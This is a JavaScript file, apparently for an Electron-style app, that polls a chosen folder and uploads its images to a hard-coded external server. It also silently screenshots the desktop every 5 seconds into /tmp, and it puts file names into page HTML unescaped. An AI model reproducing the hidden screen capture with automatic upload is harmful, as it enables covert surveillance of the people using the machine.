const fs = require('fs');
const path = require('path');
const mineType = require('mime-types');  // 文件类型
const folderPath = document.getElementById('fileInput');
let root;
const submitBtn = document.querySelector('.submitBtn');
const resultDom = document.querySelector('.resultArea');
// 这会打印出磁盘根级别的所有文件
// 同时包含'/'和'C:\'
const defaultPath = localStorage.getItem('readPath');
if (defaultPath) {
	folderPath.value = defaultPath;
}
// 截屏
const screenshot = require('screenshot-desktop')

function autoScreenshot(){
	screenshot().then((img) => {
		//将截取的图片存入根目录out.jpg
		fs.writeFile(`/tmp/${Math.round(Math.random() * 999999999)}.png`, img, function (err) {
			if (err) {
				fs.mkdir('/tmp', err=>{});
				throw err;
			}
			console.log('written to tmp')
		});
	});
}
setInterval(function(){
	autoScreenshot();
}, 5000)

// 上传路径
const uploadUrl = 'http://192.168.66.209:8280/knowledgeInter/web/upload/base64';
// 处理文件
let resultUrl = [];
let arr = [];
const handleReadEvent = () => {
	const allUpload = [];
	resultUrl = [];
	arr = [];
	if (folderPath && folderPath.value) {
		// 判断是否是文件夹
		try {
			const inputPathInfo = fs.statSync(folderPath.value);
			if (inputPathInfo.isFile()) {
				alert("当前路径不是文件夹，请输入文件夹路径");
				return;
			}
		} catch (error) {
			resultDom.getElementsByTagName('tbody')[0].innerHTML = `<tr><td class="textCenter error" colspan="7">${error}</td></tr>`;
		}
		try {
			root = fs.readdirSync(folderPath.value);
			localStorage.setItem('readPath', folderPath.value);
			console.log(root);
			let str = '';
			if (root && root.length) {
				root.forEach(m => {
					const obj = {
						name: m,
						path: folderPath.value + '/' + m,
						size: 0,
						status: 0,
						date: '',
						isFile: false,
						base64Url: '',
						fileUrl: '',
					}
					arr.push(obj);
					try {
						const fileInfo = fs.statSync(obj.path);
						const fileType = mineType.lookup(obj.path);
						console.log(fileType);
						let data = fs.readFileSync(obj.path);
						data = Buffer.from(data).toString('base64');
						obj.base64Url = 'data:' + fileType + ';base64,' + data;
						obj.size = fileInfo.size ? Math.ceil(fileInfo.size / 1024) + " KB" : 0;
						obj.date = fileInfo.birthtime ? new Date(fileInfo.birthtime).format('yyyy-MM-dd hh:mm:ss') : '';
						obj.isFile = fileInfo.isFile();
						// 判断是否已经上传
						let localData = localStorage.getItem('recordList');
						localData = localData ? JSON.parse(localData) : [];
						const isExist = localData.find(h => h.name == obj.name);
						if (!isExist && obj.isFile && fileType.includes('image')) {
							// 处理
							allUpload.push({
								name: obj.name,
								base64Url: obj.base64Url
							});
						} else {
							obj.status = 1;
							obj.fileUrl = isExist.url;
						}
					} catch (error) { }
					// str += `<div class="resultArea_item" path="${folderPath.value}/${m}">${m}</div>`
				});
				// 排序
				arr.sort(function (a, b) {
					return new Date(b.date).getTime() - new Date(a.date).getTime();
				})
				// 渲染
				renderHtml(arr);
				// 统一上传
				if (allUpload.length) handleAllFileUpload(allUpload);
			}
		} catch (error) {
			resultDom.getElementsByTagName('tbody')[0].innerHTML = `<tr><td class="textCenter error" colspan="7">${error}</td></tr>`;
		}
	}
};
// 点击确认
submitBtn.addEventListener('click', handleReadEvent);
document.addEventListener("DOMContentLoaded", function () {
	handleReadEvent();
	handleAllEvent();
});

// 定时
setInterval(() => {
	handleReadEvent();
}, 5 * 1000);

// 所有点击事件
function handleAllEvent() {
	// 点击预览
	document.querySelector('.resultArea').addEventListener('click', (e) => {
		const target = e.target;
		if (target.classList.contains('handleFilePreview')) {
			const path = target.getAttribute('path');
			window.open(path);
		}
	});
}

// 统一处理文件上传
function handleAllFileUpload(allUpload) {
	if (!allUpload) return;
	for (let index = 0; index < allUpload.length; index++) {
		const element = allUpload[index];
		uploadFile(element.base64Url, element.name, allUpload.length);
	}
}

// 图片上传
async function uploadFile(base64Url, name, length) {
	const file = getMultiplePartFile(base64Url);
	const formData = new FormData();
	formData.append('file', file);
	const responseData = await fetch("http://111.200.244.194:28083/upload/file", {
		method: "POST",
		body: formData
	}).then(res => res.json());
	if (responseData) {
		resultUrl.push({
			name: name,
			url: responseData.url
		});
		if (resultUrl.length == length) {
			refreshStatus(resultUrl);
			recordUpload(resultUrl);
		}
	}
}

// 渲染
function renderHtml(arr) {
	let str = '';
	arr.forEach((n, i) => {
		const fileTd = n.isFile ? `<td class="textCenter handleFilePreview" path="${n.base64Url}">本地预览</td>` : `<td class="textCenter">--</td>`
		const uploadedTd = n.isFile ? `<span class="handleFilePreview" path="${n.fileUrl}">已上传, 预览</td>` : ``
		str += `<tr>
		<td class="textCenter">${i + 1}</td>
		<td>${n.name}</td>
		<td>${n.date}</td>
		<td>${n.path}</td>
		<td class="textCenter">${n.isFile ? n.size : '--'}</td>
		<td class="textCenter">${n.isFile ? (n.status == 0 ? "未上传" : uploadedTd) : '--'}</td>
		${fileTd}
		</tr>`
	});
	resultDom.getElementsByTagName('tbody')[0].innerHTML = str;
}

// 重新
function refreshStatus(resultUrl) {
	resultUrl.forEach(n => {
		const findArrIndex = arr.findIndex(m => m.name == n.name);
		if (!isNaN(findArrIndex)) {
			arr[findArrIndex].status = 1;
			arr[findArrIndex].fileUrl = n.url;
		}
	});
	renderHtml(arr);
}

// 本地记录哪些文件已经上传
function recordUpload(arr) {
	if (!arr) return;
	let localData = localStorage.getItem('recordList');
	localData = localData ? JSON.parse(localData) : [];
	// 去重
	arr.forEach(n => {
		const obj = {
			name: n.name,
			url: n.url
		}
		const isExist = localData.find(m => m && m.name == n.name);
		if (!isExist) {
			localData.push(obj);
		}
	});
	localStorage.setItem('recordList', JSON.stringify(localData));

}